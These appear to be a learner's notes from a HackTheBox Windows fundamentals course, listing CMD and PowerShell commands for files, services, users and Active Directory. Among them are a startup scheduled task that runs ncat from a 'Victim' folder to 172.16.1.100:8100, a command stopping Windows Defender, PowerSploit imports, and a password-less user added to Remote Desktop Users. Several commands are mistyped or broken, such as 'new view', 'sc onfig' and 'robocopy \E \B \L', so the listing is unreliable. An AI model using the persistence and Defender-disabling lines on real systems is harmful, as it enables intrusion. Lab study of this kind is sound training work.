# Linux

# Windows

## CMD Line, Fundamentals

### CMD

```cmd
ssh htb-student@<IP-Address>

doskey /history
cls
ping 8.8.8.8

ipconfig /?
ipconfig /all
arp /a

cd
cd C:\User\htb\Pictures
cd ..\..\..\..\
cd .\Pictures

whoami
whoami /groups
whoami /priv
net user
net group
net localgroup
net share
new view
systeminfo
hostname
ver
sc query type= service
sc stop windefend
sc query Spooler
sc stop Spooler
sc start Spooler
sc query wuaserv
sc query bits
sc onfig wuaserv start=disabled
tasklist /svc
net start
wmic service list brief

SCHTASKS /Query /V /FO list
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
schtasks /query /tn "My Secret Task" /V /fo list
schtasks /delete  /tn "My Secret Task" 


where calc.exe
where /R C:\ bio.txt
where /R C:\Users/student\ bio.txt
where /R C:\Users\student\ *.csv

tree 
tree /F

dir /A:R
dir /A:H

%SUPER_IMPORTANT_VARIABLE%
echo %WINDIR%
set SECRET=HTB{5UP3r_53Cr37_V4r14813}
set %SECRET%
set DCIP=172.16.5.2
setx DCIP 172.16.5.2
echo %DCIP%
setx DCIP ""

md new-directory
mkdir yet-another-dir

rd /S GitPulls

move example C:\User\htb\Documents\example

copy calc.exe C:\Users\student\Downloads\copied-calc.exe /V

xcopy C:\Users\htb\Desktop C:\Users\htb\Documents

robocopy C:\Users\htb\Desktop C:\Users\htb\Documents

robocopy \E \B \L C:\Users\htb\Desktop\example C:\Users\htb\Documents\Backup\

more \S secrets.txt
type bio.txt
echo More text for our demo file >> demo.txt

 comp .\file-1.md .\file-2.md
 fc.exe passwords.txt modded.txt /N
 sort.exe .\file-1.md /O .\sort-1.md
 sort.exe .\sort-1.md /unique

fsutil file createNew for-sure.txt 222
ren demo.txt superdemo.txt

find "password" "C:\Users\student\not-passwords.txt"
find /N /I /V "IP Address" example.txt
find /i "see" < text.txt
ipconfig /all | find /i "IPV4"
ping 8.8.8.8 & type test.txt

cd C:\Users\student\Documents\Backup && echo 'did this work' > yes.txt

del file-1
erase file-3 file-3
del /A:R
```

### PS TODO: 14

```powershell
Get-Help Test-Wsman
Update-Help
Get-Location
Get-ChildItem
Set-Location .\Documents\
Set-Location C:\Users\HTB\Documents
Get-Content Readme.md
Get-Command
Get-Command -verb get
Get-Command -noun windows*
Get-History
Get-Alias
Set-Alias -Name gh -Value Get-Help
Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
Get-Module
Get-Module -ListAvailable
Get-Help Import-Module
Import-Module .\PowerSploit.psd1
Get-NetLocalgroup
$env:PSModulePath
Get-ExecutionPolicy
Set-ExecutionPolicy undefined
Set-ExecutionPolicy -scope Process
Get-ExecutionPolicy -list
Get-Command -Module Powersploit
Get-Command -Module PowerShellGet
Find-Module -Name AdminToolbox
get-localgroup
Get-LocalUser
New-LocalUser -Name "LB" -NoPassword
$PASSWORD = Read-Host -AsSecuringSTring
Set-LocalUser -Name "LB" -Password $Password -Description "Big Dumb Head"
Get-LocalGroup
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "LB"
Get-LocalGroupMember -Name "Remote Desktop Users"
Get-WindowsCapability -Name RSAT* Online | Add-WindowsCapability -Online
Get-Module -Name ActiveDirectory -ListAvailable
Get-ADUser -Filter *
Get-ADUser -Identity TSilver
Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
> New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true
Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum" 
Get-ADUser -Identity MTanaka -Property Description
```